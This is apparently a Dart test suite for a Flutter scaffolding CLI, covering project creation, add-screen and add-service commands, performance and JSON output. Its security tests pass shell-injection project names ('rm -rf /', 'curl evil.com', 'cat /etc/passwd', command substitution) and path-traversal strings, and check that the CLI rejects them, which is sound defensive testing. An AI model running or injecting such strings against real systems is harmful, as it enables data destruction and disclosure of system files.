import 'dart:convert';
import 'dart:io';

import 'package:path/path.dart' as path;
import 'package:test/test.dart';

import '../helpers/cli_test_helper.dart';

void main() {
  group('Week 8: Testing & Quality Assurance - Comprehensive Test Suite', () {
    late Directory tempDir;
    late CliTestHelper cli;

    setUp(() {
      final testRunId = DateTime.now().millisecondsSinceEpoch;
      tempDir = Directory('${Directory.current.path}/test_generated/week8_$testRunId');
      tempDir.createSync(recursive: true);
      cli = CliTestHelper(tempDir);
    });

    tearDown(() {
      if (tempDir.existsSync()) {
        tempDir.deleteSync(recursive: true);
      }
    });

    group('E2E Integration Tests', () {
      test('complete project creation workflow', () async {
        const projectName = 'e2e_complete_test';
        
        // Test project creation
        final createResult = await cli.createProject(
          projectName,
          organization: 'com.test',
          platforms: ['ios', 'android'],
        );

        expect(createResult.exitCode, equals(0));
        
        final projectPath = path.join(tempDir.path, projectName);
        expect(Directory(projectPath).existsSync(), isTrue);
        
        // Test add screen command
        final addScreenResult = await cli.addScreen(
          'test_screen',
          feature: 'home',
          withViewModel: true,
          withTests: true,
        );

        expect(addScreenResult.exitCode, equals(0));
        
        // Test add service command
        final addServiceResult = await cli.addService(
          'test_service',
          feature: 'core',
          type: 'api',
          withTests: true,
          withMocks: true,
        );

        expect(addServiceResult.exitCode, equals(0));
        
        // Test context export
        final contextResult = await cli.runCommand(
            'context', args: ['export', '--output=.ai/project_context.md']);

        expect(contextResult.exitCode, equals(0));
      });

      test('error handling workflow', () async {
        // Test invalid project name
        final invalidResult = await cli.createProject('Invalid Project Name!');

        expect(invalidResult.exitCode, equals(1));
        
        final output = json.decode(invalidResult.stdout as String) as Map<String, dynamic>;
        expect(output['success'], isFalse);
        expect(output['error']['message'], contains('Invalid project name'));
      });
    });

    group('Platform-Specific Tests', () {
      test('current platform compatibility', () async {
        const projectName = 'platform_compatibility_test';

        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(tempDir.path, projectName);
        expect(Directory(projectPath).existsSync(), isTrue);
        
        // Test platform-specific file operations
        final pubspecFile = File(path.join(projectPath, 'pubspec.yaml'));
        expect(pubspecFile.existsSync(), isTrue);
        
        final content = pubspecFile.readAsStringSync();
        expect(content, isNotEmpty);
        expect(content.contains('name: $projectName'), isTrue);
      });
    });

    group('Performance Tests', () {
      test('project creation performance', () async {
        const projectName = 'performance_test';
        final stopwatch = Stopwatch()..start();

        final result = await cli.createProject(projectName);

        stopwatch.stop();
        
        expect(result.exitCode, equals(0));
        expect(stopwatch.elapsedMilliseconds, lessThan(30000)); // Should complete within 30 seconds
        
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output['success'], isTrue);
        expect((output['data'] as Map<String, dynamic>)['duration_ms'], lessThan(30000));
      });

      test('multiple project creation performance', () async {
        final projectNames = List.generate(5, (index) => 'perf_test_$index');
        final stopwatch = Stopwatch()..start();
        
        for (final projectName in projectNames) {
          final result = await cli.createProject(projectName);

          expect(result.exitCode, equals(0));
        }
        
        stopwatch.stop();
        expect(stopwatch.elapsedMilliseconds, lessThan(60000)); // Should complete within 60 seconds for 5 projects
      });
    });

    group('Memory Leak Tests', () {
      test('multiple project creation does not leak memory', () async {
        final projectNames = List.generate(10, (index) => 'memory_test_$index');
        
        for (final projectName in projectNames) {
          final result = await cli.createProject(projectName);

          expect(result.exitCode, equals(0));
          
          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
          expect(output['success'], isTrue);
        }

        // Verify all projects were created
        for (final projectName in projectNames) {
          final projectPath = path.join(tempDir.path, projectName);
          expect(Directory(projectPath).existsSync(), isTrue);
        }
      });
    });

    group('Generated Project Validation', () {
      test('minimal project structure and content', () async {
        const projectName = 'validation_test';

        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(tempDir.path, projectName);
        
        // Validate structure
        expect(Directory(projectPath).existsSync(), isTrue);
        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
        expect(File(path.join(projectPath, 'lib', 'main.dart')).existsSync(), isTrue);
        expect(File(path.join(projectPath, 'test', 'widget_test.dart')).existsSync(), isTrue);
        expect(File(path.join(projectPath, 'README.md')).existsSync(), isTrue);
        
        // Validate content
        final pubspecContent = File(path.join(projectPath, 'pubspec.yaml')).readAsStringSync();
        expect(pubspecContent.contains('name: $projectName'), isTrue);
        expect(pubspecContent.contains('description: A new Flutter project'), isTrue);
        
        final mainContent = File(path.join(projectPath, 'lib', 'main.dart')).readAsStringSync();
        expect(mainContent.contains('MinimalExampleApp'), isTrue);
        expect(mainContent.contains('MinimalExampleHomePage'), isTrue);
      });

      test('riverpod project structure and content', () async {
        const projectName = 'riverpod_validation_test';

        final result = await cli.createProject(
            projectName, template: 'riverpod');

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(tempDir.path, projectName);
        
        // Validate structure
        expect(Directory(projectPath).existsSync(), isTrue);
        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
        expect(File(path.join(projectPath, 'lib', 'main.dart')).existsSync(), isTrue);
        expect(File(path.join(projectPath, 'test', 'widget_test.dart')).existsSync(), isTrue);
        
        // Validate feature structure
        expect(Directory(path.join(projectPath, 'lib', 'features')).existsSync(), isTrue);
        expect(Directory(path.join(projectPath, 'lib', 'core')).existsSync(), isTrue);
        expect(Directory(path.join(projectPath, 'lib', 'features', 'home')).existsSync(), isTrue);
        expect(Directory(path.join(projectPath, 'lib', 'features', 'profile')).existsSync(), isTrue);
        
        // Validate content
        final pubspecContent = File(path.join(projectPath, 'pubspec.yaml')).readAsStringSync();
        expect(pubspecContent.contains('name: $projectName'), isTrue);
        expect(pubspecContent.contains('flutter_riverpod:'), isTrue);
        expect(pubspecContent.contains('go_router:'), isTrue);
        
        final mainContent = File(path.join(projectPath, 'lib', 'main.dart')).readAsStringSync();
        expect(mainContent.contains('RiverpodExampleApp'), isTrue);
        expect(mainContent.contains('ProviderScope'), isTrue);
      });
    });

    group('Security Tests', () {
      test('input validation security', () async {
        final maliciousNames = [
          'project; rm -rf /',
          'project && curl evil.com',
          'project | cat /etc/passwd',
          'project`whoami`',
          r'project$(id)',
        ];

        for (final maliciousName in maliciousNames) {
          final result = await cli.createProject(maliciousName);

          expect(result.exitCode, equals(1));
          
          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
          expect(output['success'], isFalse);
          expect(output['error']['message'], contains('Invalid project name'));
        }
      });

      test('path traversal security', () async {
        final traversalPaths = [
          '../../../etc/passwd',
          r'..\..\..\windows\system32',
          '....//....//....//etc//passwd',
        ];

        for (final traversalPath in traversalPaths) {
          final result = await cli.createProject(traversalPath);

          expect(result.exitCode, equals(1));
          
          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
          expect(output['success'], isFalse);
        }
      });
    });

    group('JSON Output Validation', () {
      test('successful command JSON output', () async {
        const projectName = 'json_success_test';

        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        expect(result.stdout, isNotEmpty);
        
        // Parse and validate JSON
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output, isA<Map<String, dynamic>>());
        expect(output['success'], isTrue);
        expect(output['command'], equals('create'));
        expect(output['message'], isA<String>());
        expect(output['data'], isA<Map<String, dynamic>>());
        expect((output['data'] as Map<String, dynamic>)['project_name'], equals(projectName));
        expect((output['data'] as Map<String, dynamic>)['template'], equals('minimal'));
        expect((output['data'] as Map<String, dynamic>)['files_generated'], isA<int>());
        expect((output['data'] as Map<String, dynamic>)['duration_ms'], isA<int>());
        expect((output['data'] as Map<String, dynamic>)['target_directory'], isA<String>());
        expect(output['next_steps'], isA<List>());
      });

      test('error command JSON output', () async {
        final result = await cli.createProject('Invalid Project Name!');

        expect(result.exitCode, equals(1));
        expect(result.stdout, isNotEmpty);
        
        // Parse and validate error JSON
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output, isA<Map<String, dynamic>>());
        expect(output['success'], isFalse);
        expect(output['command'], equals('create'));
        expect(output['error'], isA<Map<String, dynamic>>());
        expect(output['error']['message'], isA<String>());
        expect(output['error']['suggestion'], isA<String>());
      });
    });

    group('Comprehensive Quality Assurance', () {
      test('all commands work correctly', () async {
        final commands = [
          ['--version'],
          ['doctor'],
          ['schema', 'export'],
        ];
        
        for (final command in commands) {
          final result = await cli.runCliCommand(command);
          expect(result.exitCode, equals(0));
        }
      });

      test('all templates generate valid projects', () async {
        final templates = ['minimal', 'riverpod'];
        
        for (final template in templates) {
          final projectName = '${template}_qa_test';

          final result = await cli.createProject(
              projectName, template: template);

          expect(result.exitCode, equals(0));
          
          final projectPath = path.join(tempDir.path, projectName);
          expect(Directory(projectPath).existsSync(), isTrue);
          expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
        }
      });

      test('all add commands work correctly', () async {
        // Create a test project first
        final testProject = Directory(path.join(tempDir.path, 'add_commands_qa_test'));
        testProject.createSync();
        
        File(path.join(testProject.path, 'pubspec.yaml')).writeAsStringSync('''
name: add_commands_qa_test
description: A test project for add commands QA
version: 1.0.0+1

environment:
  sdk: ">=3.0.0 <4.0.0"
  flutter: ">=3.10.0"

dependencies:
  flutter:
    sdk: flutter

dev_dependencies:
  flutter_test:
    sdk: flutter

flutter:
  uses-material-design: true
''');
        
        Directory(path.join(testProject.path, 'lib')).createSync();
        Directory(path.join(testProject.path, 'test')).createSync();
        
        // Test add screen command
        final addScreenResult = await cli.addScreen(
          'test_screen',
          feature: 'home',
          withViewModel: true,
          withTests: true,
        );

        expect(addScreenResult.exitCode, equals(0));
        
        // Test add service command
        final addServiceResult = await cli.addService(
          'test_service',
          feature: 'core',
          type: 'api',
          withTests: true,
          withMocks: true,
        );

        expect(addServiceResult.exitCode, equals(0));
      });
    });
  });
}
